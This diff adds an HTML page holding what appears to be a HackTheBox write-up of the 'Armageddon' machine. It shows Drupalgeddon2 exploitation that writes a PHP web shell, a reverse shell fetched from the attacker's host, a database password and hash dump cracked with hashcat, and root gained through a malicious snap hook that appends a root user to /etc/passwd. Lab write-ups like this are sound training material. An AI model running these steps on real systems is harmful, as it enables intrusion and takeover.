@@ -1,0 +1,219 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>"Armgagedon" </title></head><body>
+<ul>
+<li>Hackthebox
+header:
+  teaser: "/assets/blogs/2021-02-27-Self-Respect/respect.jpeg"</li>
+</ul>
+<hr />
+<p>First I started this machine with an nmap scan </p>
+<h2 id="recon">Recon</h2>
+<p>```bash
+$cat nmap-scan </p>
+<h1 id="nmap-791-scan-initiated-thu-apr-29-153749-2021-as-nmap-a-on-nmap-scan-v-101010233">Nmap 7.91 scan initiated Thu Apr 29 15:37:49 2021 as: nmap -A -oN nmap-scan -v 10.10.10.233</h1>
+<p>Nmap scan report for 10.10.10.233
+Host is up (0.020s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|<em>  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods: 
+|</em>  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon</p>
+<p>Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p>
+<h1 id="nmap-done-at-thu-apr-29-153800-2021-1-ip-address-1-host-up-scanned-in-1070-seconds">Nmap done at Thu Apr 29 15:38:00 2021 -- 1 IP address (1 host up) scanned in 10.70 seconds</h1>
+<p>```</p>
+<h2 id="shell-as-apache">Shell as Apache</h2>
+<p>I saw from the nmap scan that it was running Drupal 7 so I used this tool drupalgeddon2 to test for any well known vulnerabilities related to Drupal https://github.com/dreadlocked/Drupalgeddon2 and ran it and it was vulnerable to CVE- which gave me remote code execution on the machine</p>
+<p>```bash
+$ruby drupalgeddon2.rb http://10.10.10.233
+[*] --==[::#Drupalggedon2::]==--</p>
+<hr />
+<h2 id="i-target-http101010233">[i] Target : http://10.10.10.233/</h2>
+<p>[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
+[+] Drupal!: v7.56</p>
+<hr />
+<p>[*] Testing: Form   (user/password)
+[+] Result : Form valid</p>
+<hr />
+<p>[*] Testing: Clean URLs
+[!] Result : Clean URLs disabled (HTTP Response: 404)
+[i] Isn't an issue for Drupal v7.x</p>
+<hr />
+<p>[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo HMZIJPZB
+[+] Result : HMZIJPZB
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!</p>
+<hr />
+<p>[*] Testing: Existing file   (http://10.10.10.233/shell.php)
+[!] Response: HTTP 200 // Size: 6.   <strong><em>Something could already be there?</em></strong></p>
+<hr />
+<p>[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : &lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&gt;&amp;1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!</p>
+<hr />
+<p>[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
+armageddon.htb&gt;&gt; whoami
+apache
+armageddon.htb&gt;&gt; id
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+armageddon.htb&gt;&gt; 
+```</p>
+<p>Next I used curl on the machine (as wget wasn't on the machine) to download a php reverse shell and put it in the web directory. Although you don't actually need to do this.</p>
+<p>I used the php reverse shell found in the directory /usr/share/webshells/php/php-reverse-shell.php and made sure to change the ip address and the port number to that of my local machine</p>
+<p>First I used python's simple http server to host the php reverse shell using the command
+<code>$sudo python -m SimpleHTTPServer 80</code></p>
+<p><code>bash
+armageddon.htb&gt;&gt; curl http://10.10.16.91/php-reverse-shell.php -o php-reverse-shell.php
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  5493  100  5493    0     0  42169      0 --:--:-- --:--:-- --:--:-- 42253
+armageddon.htb&gt;&gt;</code></p>
+<h2 id="apache-brucetherealadmin">Apache =&gt; brucetherealadmin:</h2>
+<p>Next I first enumerated the drupal configuration's file located in     /var/www/html/sites/default/settings.php and managed to find mysql login credentials 
+```bash
+$databases = array (                                                                                                 <br />
+  'default' =&gt;                                                                                                       <br />
+  array (                                                                                                            <br />
+    'default' =&gt;                                                                                                     <br />
+    array (                                                                                                          <br />
+      'database' =&gt; 'drupal',                                                                                        <br />
+      'username' =&gt; 'drupaluser',                                                                                    <br />
+      'password' =&gt; 'CQHEy@9M*m23gBVj',                                                                              <br />
+      'host' =&gt; 'localhost',                                                                                         <br />
+      'port' =&gt; '',                                                                                                  <br />
+      'driver' =&gt; 'mysql',                                                                                           <br />
+      'prefix' =&gt; '',                                                                                                <br />
+    ),                                                                                                               <br />
+  ),                                                                                                                 <br />
+); 
+]</p>
+<p>```</p>
+<p>From here I was a little stuck trying to get a pty reverse shell so that I could access the mysql database and start enumeration of that. However I didn't find anyway for me to do that so instead I executed commands in mysql using the "-e" arument which worked a charm and I was able to get the password hash of brucetherealadmin</p>
+<p><code>bash
+armageddon.htb&gt;&gt; mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "use drupal;select * from users;"
+uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
+0                                               NULL    0       0       0       0       NULL            0               NULL
+1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1619728537      1619728537      1       Europe/London           0       admin@armageddon.eu   a:1:{s:7:"overlay";i:1;}
+armageddon.htb&gt;&gt;</code></p>
+<p>Next I copied the password hash and cracked it using hashcat and the rockyou wordlist. But first I used hashid to identify the hash and it was a drupal 7 hash</p>
+<p><code>bash
+$hashid hash.txt 
+--File 'hash.txt'--
+Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
+[+] Drupal &gt; v7.x 
+--End of file 'hash.txt'--������[chris@kali]���[~/Documents/htb/armageddon]
+������������ $</code></p>
+<p>Looking on the hashcat website of example hashes the mode I would need to use was 7900 for a drupal 7 hash https://hashcat.net/wiki/doku.php?id=example_hashes </p>
+<p>Next I used hashcat to crack the password which gave me the password of booboo</p>
+<p>```bash
+$hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.1.1) starting...</p>
+<h1 id="opencl-api-opencl-12-pocl-16-noneasserts-llvm-901-reloc-sleef-distro-pocl_debug-platform-1-the-pocl-project">OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</h1>
+<ul>
+<li>Device #1: pthread-Intel(R) Core(TM) i7-6700K CPU @ 4.00GHz, 3300/3364 MB (1024 MB allocatable), 4MCU</li>
+</ul>
+<p>Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256</p>
+<p>INFO: All hashes found in potfile! Use --show to display them.</p>
+<p>Started: Fri Apr 30 08:44:46 2021
+Stopped: Fri Apr 30 08:44:47 2021
+������[chris@kali]���[~/Documents/htb/armageddon]
+������������ $hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt --show
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
+```</p>
+<p>WIth this password I used ssh to access the machine as brucetherealadmin user</p>
+<h2 id="brucetherealadmin-root">Brucetherealadmin =&gt; root</h2>
+<p>The first thing I did was use sudo -l to see if I could run any commands as the root user and I could run snap with sudo </p>
+<p>```bash
+$ sudo -l
+Matching Defaults entries for brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</p>
+<p>User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+```</p>
+<p>Looking at gtfobins website for how to exploit this I could install fpm on the local machine and use that to generate a malicious package on the remote machine.
+https://gtfobins.github.io/gtfobins/snap/#sudo</p>
+<p>To install I followed the instructions on the website 
+https://fpm.readthedocs.io/en/latest/installing.html
+Using the commands on my local Kali machine
+<code>sudo apt-get install ruby ruby-dev rubygems build-essential</code>
+and
+<code>gem install --no-document fpm</code></p>
+<p>Next for the command variable I had it echo in a new root user which I knew the password for.
+So used 
+```bash
+$COMMAND="echo root2:wPOZpnYePkDww:0:0:root:/root:/bin/bash &gt;&gt; /etc/passwd"
+������[chris@kali]���[~/Documents/htb/armageddon]
+������������ $cd $(mktemp -d)
+������[chris@kali]���[/tmp/tmp.T3ug2flct2]
+������������ $mkdir -p meta/hooks
+������[chris@kali]���[/tmp/tmp.T3ug2flct2]
+������������ $printf '#!/bin/sh\n%s; false' "$COMMAND" &gt;meta/hooks/install
+������[chris@kali]���[/tmp/tmp.T3ug2flct2]
+������������ $chmod +x meta/hooks/install
+������[chris@kali]���[/tmp/tmp.T3ug2flct2]
+������������ $fpm -n xxxx -s dir -t snap -a all meta
+Created package {:path=&gt;"xxxx_1.0_all.snap"}
+������[chris@kali]���[/tmp/tmp.T3ug2flct2]
+������������ $sudo python -m SimpleHTTPServer 80
+[sudo] password for chris: 
+Serving HTTP on 0.0.0.0 port 80 ...</p>
+<p>```</p>
+<p>With the package generated I transferred it over to the machine using curl and python's simplehttpserver
+and then ran it</p>
+<p><code>$ curl http://10.10.16.91/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  4096  100  4096    0     0    99k      0 --:--:-- --:--:-- --:--:--  105k
+[brucetherealadmin@armageddon ~]$ ls
+user.txt  xxxx_1.0_all.snap
+[brucetherealadmin@armageddon ~]$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+error: cannot perform the following tasks:
+- Run install hook of "xxxx" snap if present (run hook "install": exit status 1)
+[brucetherealadmin@armageddon ~]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+root2:wPOZpnYePkDww:0:0:root:/root:/bin/bash
+[brucetherealadmin@armageddon ~]$ su - root2
+Password: 
+Last login: Thu Apr 29 17:18:50 BST 2021 on pts/1
+[root@armageddon ~]# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+[root@armageddon ~]#</code>
+With that I got root on the machine!</p>
+</body></html>
